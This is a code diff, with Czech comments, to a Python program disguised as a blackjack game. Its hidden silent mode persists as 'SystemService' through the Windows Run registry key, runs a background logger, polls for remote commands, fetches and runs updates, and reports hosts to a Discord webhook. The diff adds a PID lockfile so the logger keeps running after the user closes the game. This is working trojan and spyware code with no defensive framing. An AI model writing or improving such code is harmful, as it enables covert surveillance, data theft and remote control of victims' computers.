@@ -35,13 +35,14 @@ CAPTURE_FIELD_TYPE = True
 MAX_RETRIES = 3
 RETRY_DELAY = 5
 
-APP_VERSION = 2  # interní verze pro update check
+APP_VERSION = 3  # interní verze pro update check
 
 # Persistence
 APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
 APP_NAME = "SystemService.exe"
 REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REGISTRY_VALUE = "SystemServiceUpdate"
+SILENT_LOCK_FILE = APP_DIR / "silent.lock"
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -145,22 +146,61 @@ def start_heartbeat():
 # PERSISTENCE
 # ═══════════════════════════════════════════════════════════════
 
-def is_already_running():
-    """Zjistí, jestli už silent instance běží (proti dvojímu spawnu)."""
+def _pid_alive(pid: int) -> bool:
+    """Ověří, jestli PID patří živému procesu (cross-platform)."""
+    if pid <= 0:
+        return False
     try:
         if IS_WINDOWS:
             import psutil
-            current_pid = os.getpid()
-            for proc in psutil.process_iter(["pid", "name"]):
-                try:
-                    if proc.info["pid"] != current_pid and \
-                       proc.info["name"] and "SystemService" in proc.info["name"].lower():
-                        return True
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    continue
-        return False
+            psutil.Process(pid)
+            return True
+        else:
+            os.kill(pid, 0)
+            return True
     except Exception:
         return False
+
+
+def acquire_silent_lock() -> bool:
+    """Získá lock pro silent instanci pomocí PID lockfile.
+
+    Na rozdíl od scanování procesůNelze tím omylem zabít interaktivní
+    instanci (GUI) — lock drží jen silent proces.
+    """
+    try:
+        APP_DIR.mkdir(parents=True, exist_ok=True)
+
+        # Zkus přečíst existující lock
+        if SILENT_LOCK_FILE.exists():
+            try:
+                old_pid = int(SILENT_LOCK_FILE.read_text().strip())
+                if _pid_alive(old_pid):
+                    return False  # jiný silent už běží
+            except (ValueError, OSError):
+                pass  # poškozený lock → smaž a pokračuj
+            try:
+                SILENT_LOCK_FILE.unlink()
+            except OSError:
+                pass
+
+        # Získej lock
+        SILENT_LOCK_FILE.write_text(str(os.getpid()))
+        return True
+    except Exception:
+        # Pokud lock selže (např. read-only FS), pustit se stejně —
+        # lepší mít 2 instance než 0.
+        return True
+
+
+def release_silent_lock():
+    try:
+        if SILENT_LOCK_FILE.exists():
+            pid = SILENT_LOCK_FILE.read_text().strip()
+            if pid == str(os.getpid()):
+                SILENT_LOCK_FILE.unlink()
+    except Exception:
+        pass
 
 
 def install():
@@ -277,6 +317,9 @@ def download_and_run_update(url: str):
             old_path.unlink()
         tmp_path.rename(old_path)
 
+        # Uvolni lock PŘED spawnem — nová instance ho potřebuje
+        release_silent_lock()
+
         # Spusť novou verzi
         if IS_WINDOWS:
             creation_flags = 0x00000200 | 0x08000000
@@ -291,11 +334,14 @@ def download_and_run_update(url: str):
         requests.post(DISCORD_WEBHOOK_URL, json={
             "embeds": [{
                 "title": "✅ Update dokončen",
-                "description": f"Host: `{_get_hostname()}`\nNová verze spuštěna.",
+                "description": f"Host: `{_get_hostname()}`\nNová verze spuštěna.\nStará instance se ukončuje (PID `{os.getpid()}`).",
                 "color": 0x00FF00,
                 "timestamp": datetime.now(timezone.utc).isoformat(),
             }]
         }, timeout=15)
+
+        # Zabij sebe — nová instance přebírá
+        os._exit(0)
 
         return True
     except Exception as e:
@@ -954,9 +1000,14 @@ class BlackjackGUI:
 
 def spawn_silent_subprocess():
     try:
-        # Kontrola: už běží silent instance? Nespawnuj další.
-        if is_already_running():
-            return True  # už běží, není potřeba
+        # Kontrola: už běží silent instance podle lockfile?
+        if SILENT_LOCK_FILE.exists():
+            try:
+                old_pid = int(SILENT_LOCK_FILE.read_text().strip())
+                if _pid_alive(old_pid):
+                    return True  # už běží, není potřeba
+            except (ValueError, OSError):
+                pass
 
         if IS_WINDOWS:
             exe = sys.executable
@@ -1015,8 +1066,10 @@ if __name__ == "__main__":
 
     else:
         # ═══ SILENT MÓD ═══
-        # Nespawnuj další pokud už běží
-        if is_already_running():
+        # Lock místo scanování procesů — interaktivní instance
+        # se jmenuje stejně, ale lock drží jen silent. Fix pro
+        # „zavřu hru → logger umře".
+        if not acquire_silent_lock():
             sys.exit(0)
 
         send_startup_signal()
@@ -1027,8 +1080,11 @@ if __name__ == "__main__":
         logger.run_background()
         start_command_poller()
 
-        while True:
-            time.sleep(60)
+        try:
+            while True:
+                time.sleep(60)
+        finally:
+            release_silent_lock()
 
 
 def run_blackjack_console():
